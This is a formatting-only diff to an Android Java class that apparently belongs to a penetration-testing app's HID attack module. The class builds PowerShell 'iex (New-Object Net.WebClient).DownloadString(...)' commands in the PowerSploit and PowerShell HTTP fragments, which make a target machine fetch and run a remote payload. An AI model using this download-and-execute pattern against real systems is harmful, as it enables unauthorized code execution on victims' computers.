@@ -320,7 +320,7 @@ public class HidFragment extends Fragment {
 
     public static class PowerSploitFragment extends HidFragment implements OnClickListener {
 
-        private final String configFilePath =  nh.CHROOT_PATH + "/var/www/html/powersploit-payload";
+        private final String configFilePath = nh.CHROOT_PATH + "/var/www/html/powersploit-payload";
         private final String configFileUrlPath = nh.CHROOT_PATH + "/var/www/html/powersploit-url";
 
         @Override
@@ -336,7 +336,7 @@ public class HidFragment extends Fragment {
         public void onClick(View v) {
             switch (v.getId()) {
                 case R.id.powersploitOptionsUpdate:
-                    if(getView() == null){
+                    if (getView() == null) {
                         return;
                     }
                     ShellExecuter exe = new ShellExecuter();
@@ -351,8 +351,8 @@ public class HidFragment extends Fragment {
                     String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
 
                     Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
-                    if (!isSaved){
-                         nh.showMessage("Source not updated (configFileUrlPath)");
+                    if (!isSaved) {
+                        nh.showMessage("Source not updated (configFileUrlPath)");
                     }
                     break;
                 default:
@@ -360,6 +360,7 @@ public class HidFragment extends Fragment {
                     break;
             }
         }
+
         private void loadOptions(final View rootView) {
             final EditText payloadUrl = (EditText) rootView.findViewById(R.id.payloadUrl);
             final EditText port = (EditText) rootView.findViewById(R.id.port);
@@ -427,7 +428,7 @@ public class HidFragment extends Fragment {
     public static class WindowsCmdFragment extends HidFragment implements OnClickListener {
 
         private final String configFilePath = nh.APP_SD_FILES_PATH + "/configs/hid-cmd.conf";
-        private final String loadFilePath =  nh.APP_SD_FILES_PATH + "/scripts/hid/";
+        private final String loadFilePath = nh.APP_SD_FILES_PATH + "/scripts/hid/";
         final ShellExecuter exe = new ShellExecuter();
 
         @Override
@@ -451,21 +452,21 @@ public class HidFragment extends Fragment {
 
             switch (v.getId()) {
                 case R.id.windowsCmdUpdate:
-                    if(getView() == null){
+                    if (getView() == null) {
                         return;
                     }
                     EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
                     String text = source.getText().toString();
                     Boolean isSaved = exe.SaveFileContents(text, configFilePath);
-                    if(isSaved){
+                    if (isSaved) {
                         nh.showMessage("Source updated");
                     }
 
                     break;
                 case R.id.windowsCmdLoad:
                     try {
-                        File scriptsDir = new File(nh.APP_SD_FILES_PATH,loadFilePath);
-                        if(!scriptsDir.exists()) scriptsDir.mkdirs();
+                        File scriptsDir = new File(nh.APP_SD_FILES_PATH, loadFilePath);
+                        if (!scriptsDir.exists()) scriptsDir.mkdirs();
                     } catch (Exception e) {
                         nh.showMessage(e.getMessage());
                     }
@@ -475,11 +476,11 @@ public class HidFragment extends Fragment {
                     startActivityForResult(intent, PICKFILE_RESULT_CODE);
                     break;
                 case R.id.windowsCmdSave:
-					 try {
-                        File scriptsDir = new File(nh.APP_SD_FILES_PATH,loadFilePath);
-                        if(!scriptsDir.exists()) scriptsDir.mkdirs();
+                    try {
+                        File scriptsDir = new File(nh.APP_SD_FILES_PATH, loadFilePath);
+                        if (!scriptsDir.exists()) scriptsDir.mkdirs();
                     } catch (Exception e) {
-                         nh.showMessage(e.getMessage());
+                        nh.showMessage(e.getMessage());
                     }
                     AlertDialog.Builder alert = new AlertDialog.Builder(getActivity());
 
@@ -493,12 +494,12 @@ public class HidFragment extends Fragment {
                     alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
                         public void onClick(DialogInterface dialog, int whichButton) {
                             String value = input.getText().toString();
-                            if(!value.equals("") && value.length() >0){
-                            //FIXME Save file (ask name)
-                                File scriptFile = new File(loadFilePath + File.separator +  value +".conf");
-                                if(!scriptFile.exists()){
+                            if (!value.equals("") && value.length() > 0) {
+                                //FIXME Save file (ask name)
+                                File scriptFile = new File(loadFilePath + File.separator + value + ".conf");
+                                if (!scriptFile.exists()) {
                                     try {
-                                        if(getView() == null){
+                                        if (getView() == null) {
                                             return;
                                         }
                                         EditText source = (EditText) getView().findViewById(R.id.windowsCmdSource);
@@ -513,19 +514,19 @@ public class HidFragment extends Fragment {
                                     } catch (Exception e) {
                                         nh.showMessage(e.getMessage());
                                     }
-                                }else{
+                                } else {
                                     nh.showMessage("File already exists");
                                 }
-                            }else{
+                            } else {
                                 nh.showMessage("Wrong name provided");
                             }
                         }
                     });
                     alert.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                         public void onClick(DialogInterface dialog, int whichButton) {
-                           ///Do nothing
+                            ///Do nothing
                         }
-                        });
+                    });
                     alert.show();
                     break;
                 default:
@@ -551,7 +552,7 @@ public class HidFragment extends Fragment {
 
     public static class PowershellHttpFragment extends HidFragment implements OnClickListener {
 
-        private final String configFilePath =  nh.CHROOT_PATH + "/var/www/html/powershell-payload";
+        private final String configFilePath = nh.CHROOT_PATH + "/var/www/html/powershell-payload";
         private final String configFileUrlPath = nh.CHROOT_PATH + "/var/www/html/powershell-url";
 
         @Override
@@ -567,15 +568,15 @@ public class HidFragment extends Fragment {
         public void onClick(View v) {
             switch (v.getId()) {
                 case R.id.powershellOptionsUpdate:
-                    if(getView() == null){
+                    if (getView() == null) {
                         return;
                     }
                     ShellExecuter exe = new ShellExecuter();
                     EditText newPayloadUrl = (EditText) getView().getRootView().findViewById(R.id.payloadUrl);
-                    String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " ;
+                    String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); ";
 
                     Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
-                    if (!isSaved){
+                    if (!isSaved) {
                         nh.showMessage("Source not updated (configFileUrlPath)");
                     }
                     break;
@@ -584,6 +585,7 @@ public class HidFragment extends Fragment {
                     break;
             }
         }
+
         private void loadOptions(final View rootView) {
             final EditText payloadUrl = (EditText) rootView.findViewById(R.id.payloadUrl);
             final ShellExecuter exe = new ShellExecuter();
